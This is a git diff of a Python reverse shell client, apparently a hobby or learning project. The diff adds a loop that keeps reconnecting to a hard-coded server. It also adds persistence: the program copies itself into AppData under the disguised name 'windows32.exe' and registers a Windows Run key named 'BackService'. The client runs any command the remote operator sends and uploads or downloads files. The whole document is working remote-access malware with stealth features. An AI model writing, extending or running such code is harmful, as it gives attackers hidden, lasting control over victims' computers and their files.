@@ -1,10 +1,13 @@
 #!/usr/bin/python
-
+import shutil
 import socket
 import subprocess
 import json
 import os
 import base64
+import sys
+import time
+
 
 def send_j(data):
     json_data = json.dumps(data)
@@ -21,32 +24,59 @@ def recv_j():
             except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                 continue
 
+def connect():
+    while True:
+        time.sleep(10) #reconnect every 10 seconds
+        try:
+            s.connect(("192.168.92.128", 7777))  # server IP and to which port to connect to
+            shell()
+            break # disconnect the client
+        except: #call connect function again until we get shell()
+            connect()
+
 def shell():
     while True:
         cmd = recv_j() # receive command from server
+
         if cmd == "exit_client":
-            break
-        elif cmd[:2] == "cd" and len(cmd) > 1:
+            break #exit shell
+        elif cmd[:2] == "cd" and len(cmd) > 2:
             try:
                 os.chdir(cmd[3:]) #change directory to what's after "cd"
             except:
                 continue
         elif cmd[:8] == "download":
-            with open(cmd[9:], "rb") as f:
-                send_j(base64.b64encode(f.read()).decode('utf-8'))
+            try:
+                with open(cmd[9:], "rb") as f:
+                    send_j(base64.b64encode(f.read().encode('utf-8')).decode('utf-8'))
+                    f.close()
+            except:
+                error = "File not found"
+                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))
 
         elif cmd[:6] == "upload":
-            with open(cmd[9:], "wb") as f:
-                res = recv_j()
-                f.write(base64.b64decode(res))
-        else:
+            try:
+                with open(cmd[7:], "wb") as f:
+                    res = recv_j()
+                    f.write(base64.b64decode(res))
+                    f.close()
+            except:
+                send_j(base64.b64encode("Failed to upload"))
+        else: #for all other commands send output to server
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = proc.stdout.read() + proc.stderr.read()
             send_j(output.decode('utf-8')) #send output to server
 
+#adding a payload into registry run key
+
+location = os.environ["appdata"] + "\\windows32.exe" #set location naming
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable,location) #copy the executable to location set before as name windows32.exe (if compiled)
+    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackService /t REG_SZ /d "' + location + '"', shell=True)
+
 #socket creation
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#connect
-s.connect(("192.168.92.128",7777)) #server IP and to which port to connect to
-shell()
+
+connect()
+#conect
 s.close()
